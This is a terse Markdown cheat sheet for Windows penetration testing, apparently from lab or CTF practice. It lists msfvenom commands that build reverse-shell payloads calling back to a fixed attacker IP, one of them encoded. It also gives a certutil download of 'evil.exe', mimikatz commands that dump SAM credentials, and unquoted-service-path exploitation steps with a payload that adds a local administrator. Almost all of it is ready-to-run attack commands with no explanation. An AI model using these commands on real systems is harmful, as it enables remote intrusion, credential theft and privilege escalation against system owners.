# Windows Cheat Sheet

- [Windows Cheat Sheet](#windows-cheat-sheet)
  - [Generate a revshell](#generate-a-revshell)
  - [Upload a file](#upload-a-file)
  - [Add color to winPEAS](#add-color-to-winpeas)
  - [MIMIKATZ](#mimikatz)
    - [Commands](#commands)
  - [Unquoted Service Path](#unquoted-service-path)

## Generate a revshell
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.66.218 LPORT=1234 -f exe -o exp.exe
```

## Upload a file
```bash
certutil.exe -urlcache -split -f http://10.11.66.218:9999/evil.exe C:\\Temp\\evil.exe
```

## Add color to winPEAS
```bash
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

## MIMIKATZ
Upload `mimikatz`

### Commands
```
privilege::debug
lsadump::sam
```

## Unquoted Service Path
- Scan vuln services
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\\" |findstr /i /v """
```

- Check permissions
```bash
icacls "C:\Program Files\Development Files"
```

- Create a payload
```bash
msfvenom -p windows/exec CMD="net localgroup administrators sage /add" -f exe-service -o Devservice.exe
```
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.66.218 LPORT=1234 -f exe-service -o Devservice.exe
```

- Get service info
```bash
sc qc "Development Service"
```